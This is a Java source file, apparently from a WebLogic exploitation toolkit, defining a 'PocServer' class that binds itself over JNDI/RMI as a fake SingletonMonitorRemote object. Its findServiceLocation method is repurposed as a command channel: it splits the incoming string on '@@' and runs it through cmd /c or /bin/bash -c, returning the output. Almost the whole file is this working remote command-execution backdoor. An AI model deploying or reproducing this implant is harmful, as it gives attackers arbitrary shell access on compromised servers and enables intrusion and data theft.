/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.weblogic.framework.call;

import weblogic.cluster.singleton.SingletonMonitorRemote;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.io.*;
import java.rmi.RemoteException;

/**
 * Title: PocServerSingletonMonitorRemote
 * Desc: PocServer for SingletonMonitorRemote
 * Date:2020/4/3 21:23
 * @version 1.0.0
 */
public class PocServerSingletonMonitorRemote implements SingletonMonitorRemote {

    public static void main(String[] args) {
        PocServerSingletonMonitorRemote pocServer = new PocServerSingletonMonitorRemote();
        String clientName = args[0];
        pocServer.rmiBind(clientName);
    }

    /**
     * rmi bind
     * @param clientName bind 名称
     */
    public static void jndiBind(String clientName) {
        try {
            PocServerSingletonMonitorRemote rmiServer = new PocServerSingletonMonitorRemote();
            Context context = new InitialContext();
            context.rebind(clientName, rmiServer);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * rmi bind
     * @param clientName bind 名称
     */
    public void rmiBind(String clientName) {
        try {
            PocServerSingletonMonitorRemote rmiServer = new PocServerSingletonMonitorRemote();
            Context context = new InitialContext();
            context.rebind(clientName, rmiServer);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void unregister(String s) throws RemoteException {

    }

    @Override
    public void register(String s) throws RemoteException {

    }

    @Override
    public void registerJTA(String s) throws RemoteException {

    }

    @Override
    public String findServiceLocation(String cmd) throws RemoteException {
        String[] splitArr = cmd.split("@@");
        cmd = splitArr[0];
        String charsetName = splitArr[1];
        charsetName = charsetName.trim().toUpperCase();
        if(charsetName.indexOf("####") != -1){
            charsetName = charsetName.substring(0,charsetName.indexOf("####"));
        }
        return execCmd(cmd, charsetName);
    }

    @Override
    public boolean migrate(String s, String s1) throws RemoteException {
        return false;
    }

    @Override
    public boolean migrate(String s, String s1, boolean b, boolean b1) throws RemoteException {
        return false;
    }

    @Override
    public boolean migrateJTA(String s, String s1, boolean b, boolean b1) throws RemoteException {
        return false;
    }

    @Override
    public void deactivateJTA(String s, String s1) throws RemoteException {

    }

    @Override
    public void notifyShutdown(String s) {

    }

    /**
     * 执行命令
     * @param cmd 执行命令
     * @param charsetName 编码
     * @return 执行结果
     * @throws RemoteException
     */
    public String execCmd(String cmd, String charsetName){
        if(cmd == null || "".equals(cmd)){
            return "commond not null";
        }
        if("".equals(charsetName) || charsetName ==null){
            charsetName = "UTF-8";
        }
        charsetName = charsetName.trim();
        if(charsetName.toUpperCase().equals("UTF-8")){
            charsetName = "UTF-8";
        }else if(charsetName.toUpperCase().equals("GBK")){
            charsetName = "GBK";
        }else{
            charsetName = "UTF-8";
        }
        cmd = cmd.trim();
        StringBuilder result = new StringBuilder();
        Process process = null;
        BufferedReader bufrIn = null;
        BufferedReader bufrError = null;
        String os = System.getProperty("os.name");
        os = os.toLowerCase();
        String[] executeCmd = null;
        if(os.contains("win")){
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -n 4";
            }
            executeCmd = new String[]{"cmd", "/c", cmd};
        }else{
            if(cmd.contains("ping") && !cmd.contains("-n")){
                cmd += " -t 4";
            }
            executeCmd = new String[]{"/bin/bash", "-c", cmd};
        }
        try {
            process = Runtime.getRuntime().exec(executeCmd);
            process.waitFor();
            bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), charsetName));
            bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), charsetName));
            String line = null;
            while ((line = bufrIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufrError.readLine()) != null) {
                result.append(line).append('\n');
            }
        } catch (InterruptedException e) {
        } catch (UnsupportedEncodingException e) {
        } catch (IOException e) {
            return cmd+" execute error,msg: not found commond";
        } finally {
            closeStream(bufrIn);
            closeStream(bufrError);
            if (process != null) {
                process.destroy();
            }
        }
        if(result == null || "".equals(result)){
            return cmd+" execute ok!";
        }else{
            return result.toString();
        }
    }

    private void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (Exception e) {
                // TODO:
            }
        }
    }

}
